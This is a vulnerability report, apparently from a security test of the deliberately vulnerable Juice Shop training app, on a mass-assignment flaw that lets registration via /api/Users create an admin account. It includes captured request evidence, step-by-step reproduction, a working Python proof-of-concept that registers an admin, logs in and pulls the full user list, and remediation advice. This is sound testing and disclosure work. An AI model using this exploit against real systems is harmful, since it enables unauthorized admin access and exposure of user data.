╭─ VULN-0011 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Mass Assignment in Registration Allows Self-Registration as Admin    │
│  via /api/Users                                                              │
│                                                                              │
│  Severity: CRITICAL                                                          │
│                                                                              │
│  CVSS Score: 9.8                                                             │
│                                                                              │
│  Target: http://juiceshop:3000                                               │
│                                                                              │
│  Endpoint: /api/Users                                                        │
│                                                                              │
│  Method: POST                                                                │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H                            │
│                                                                              │
│  Description                                                                 │
│  The user registration endpoint accepts client-controlled fields without an  │
│  effective server-side allowlist. By including a privileged field (role) in  │
│  the registration JSON, an unauthenticated attacker can create a new         │
│  account with administrative privileges. The newly created user can then     │
│  authenticate normally and receive an admin-scoped JWT, enabling access to   │
│  protected administrative APIs.                                              │
│                                                                              │
│  Impact                                                                      │
│  An unauthenticated attacker can create an administrative account and gain   │
│  full administrative access. This enables compromise of sensitive data       │
│  (e.g., user lists and user metadata), modification of application data,     │
│  and execution of administrative actions available to the admin role. This   │
│  is a direct privilege escalation and complete authorization bypass for      │
│  administrative functionality.                                               │
│                                                                              │
│  Technical Analysis                                                          │
│  The endpoint POST /api/Users appears to bind the request body directly      │
│  into the user model. The server honors a client-supplied \"role\"           │
│  attribute during account creation, returning role=\"admin\" in the          │
│  response and assigning an admin-themed profile image (defaultAdmin.png).    │
│  This indicates that sensitive attributes are writable by untrusted clients  │
│  during registration.\n\nEvidence (captured requests):\n\n1) Privileged      │
│  registration via mass assignment\nRequest ID 3294: POST /api/Users with     │
│  JSON body containing \"role\":\"admin\" returned 201 Created and response   │
│  included:\n- \"role\":\"admin\"\n-                                          │
│  \"profileImage\":\"/assets/public/images/uploads/defaultAdmin.png\"\n-      │
│  Location: /api/Users/42\n\n2) Control registration without role\nRequest    │
│  ID 3335: POST /api/Users without a role field returned 201 Created and      │
│  response included:\n- \"role\":\"customer\"\n-                              │
│  \"profileImage\":\"/assets/public/images/uploads/default.svg\"\n\n3)        │
│  Normal authentication yields an admin JWT\nRequest ID 3326: POST            │
│  /rest/user/login for the created user returned 200 OK with a JWT whose      │
│  embedded user data includes \"role\":\"admin\".\n\n4) Admin API access      │
│  using issued JWT\nRequest ID 3330: GET /api/Users with Authorization:       │
│  Bearer <token> returned 200 OK and the full user list, demonstrating        │
│  administrative access obtained through the mass-assigned role.              │
│                                                                              │
│  PoC Description                                                             │
│  1. Register a new account while explicitly setting the role to admin:\n     │
│  - Send POST http://juiceshop:3000/api/Users with JSON including             │
│  \"role\":\"admin\".\n   - Observe 201 Created and that the response         │
│  contains role=admin and profileImage defaultAdmin.png.\n\n2. Authenticate   │
│  as the newly created user:\n   - Send POST                                  │
│  http://juiceshop:3000/rest/user/login with the same email/password.\n   -   │
│  Observe 200 OK and extract the returned JWT.\n\n3. Use the JWT to access    │
│  an admin-protected API:\n   - Send GET http://juiceshop:3000/api/Users      │
│  with header Authorization: Bearer <JWT>.\n   - Observe 200 OK and the user  │
│  list in the response.                                                       │
│                                                                              │
│  PoC Code                                                                    │
│  import json\nimport secrets\nimport sys\n\nimport requests\n\nBASE =        │
│  \"http://juiceshop:3000\"\n\n\ndef register_admin(email: str, password:     │
│  str) -> dict:\n    url = f\"{BASE}/api/Users\"\n    payload = {\n           │
│  \"email\": email,\n        \"password\": password,\n                        │
│  \"passwordRepeat\": password,\n        \"role\": \"admin\",\n               │
│  \"securityQuestion\": {\"id\": 1, \"question\": \"Your eldest siblings      │
│  middle name?\"},\n        \"securityAnswer\": \"test\",\n    }\n    r =     │
│  requests.post(url, json=payload, headers={\"Accept\":                       │
│  \"application/json\"}, timeout=15)\n    return {\"status\": r.status_code,  │
│  \"body\": r.json() if r.headers.get(\"Content-Type\",                       │
│  \"\").startswith(\"application/json\") else r.text}\n\n\ndef login(email:   │
│  str, password: str) -> str:\n    url = f\"{BASE}/rest/user/login\"\n    r   │
│  = requests.post(url, json={\"email\": email, \"password\": password},       │
│  headers={\"Accept\": \"application/json\"}, timeout=15)\n                   │
│  r.raise_for_status()\n    data = r.json()\n    return                       │
│  data[\"authentication\"][\"token\"]\n\n\ndef get_users(token: str) ->       │
│  dict:\n    url = f\"{BASE}/api/Users\"\n    headers = {\"Accept\":          │
│  \"application/json\", \"Authorization\": f\"Bearer {token}\"}\n    r =      │
│  requests.get(url, headers=headers, timeout=15)\n    return {\"status\":     │
│  r.status_code, \"body_prefix\": r.text[:400]}\n\n\ndef main() -> int:\n     │
│  email = f\"ma_admin_poc_{secrets.token_hex(4)}@juice-sh.op\"\n    password  │
│  = \"Password123!\"\n\n    reg = register_admin(email, password)\n           │
│  print(\"[+] Registration response:\")\n    print(json.dumps(reg,            │
│  indent=2)[:1200])\n\n    if reg[\"status\"] != 201:\n        print(\"[-]    │
│  Registration failed\")\n        return 1\n\n    role =                      │
│  reg[\"body\"].get(\"data\", {}).get(\"role\")\n    profile_image =          │
│  reg[\"body\"].get(\"data\", {}).get(\"profileImage\")\n    print(f\"[+]     │
│  Created role={role}, profileImage={profile_image}\")\n\n    token =         │
│  login(email, password)\n    print(f\"[+] Login OK, JWT prefix:              │
│  {token[:40]}...\")\n\n    users = get_users(token)\n    print(\"[+] GET     │
│  /api/Users result:\")\n    print(json.dumps(users, indent=2))\n\n           │
│  return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())    │
│                                                                              │
│  Remediation                                                                 │
│  Implement strict server-side allowlisting for writable fields during        │
│  registration and profile updates.\n\nRegistration hardening:\n- Ignore or   │
│  reject any client-supplied privilege fields such as role, isAdmin,          │
│  isActive, or other authorization/entitlement attributes.\n- Set role to a   │
│  safe default (e.g., customer) server-side regardless of client              │
│  input.\n\nAuthorization hardening:\n- Restrict role changes to a dedicated  │
│  administrative workflow that enforces authorization checks.\n- Add          │
│  automated tests that attempt to set privileged fields during registration   │
│  and ensure they are rejected or overwritten.\n\nDefense in depth:\n- Log    │
│  and alert on attempts to set privileged fields in unauthenticated           │
│  requests.\n- Consider schema validation that rejects unknown or forbidden   │
│  attributes.                                                                 │
│                                                                              │
